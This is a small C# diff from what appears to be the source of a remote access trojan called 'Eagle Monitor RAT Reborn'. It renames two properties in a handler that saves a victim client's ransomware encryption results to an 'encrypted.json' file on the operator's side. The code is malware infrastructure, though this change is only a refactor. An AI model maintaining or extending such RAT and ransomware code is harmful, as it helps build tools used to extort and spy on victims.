@@ -12,7 +12,7 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public RansomareEncryptionConfirmationPacketHandler(RansomwareConfirmationPacket packet) : base()
         {
-            System.IO.File.WriteAllText(ClientHandler.ClientHandlersList[packet.baseIp].clientPath + "\\Ransomware\\encrypted.json", packet.results);
+            System.IO.File.WriteAllText(ClientHandler.ClientHandlersList[packet.BaseIp].ClientPath + "\\Ransomware\\encrypted.json", packet.results);
         }
     }
 }
